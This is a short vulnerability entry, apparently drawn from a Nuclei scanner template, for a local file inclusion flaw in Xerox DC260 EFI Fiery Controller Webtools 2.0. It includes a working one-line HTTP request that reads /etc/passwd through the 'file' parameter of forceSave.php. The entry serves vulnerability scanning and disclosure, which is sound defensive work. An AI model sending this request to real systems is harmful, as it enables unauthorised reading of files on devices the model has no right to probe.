# Nuclei Template: Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion
**Template ID:** xerox-efi-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`xerox-efi-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wt3/forceSave.php?file=/etc/passwd
```

## References
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5447.php
- https://packetstormsecurity.com/files/145570
- https://www.exploit-db.com/exploits/43398/
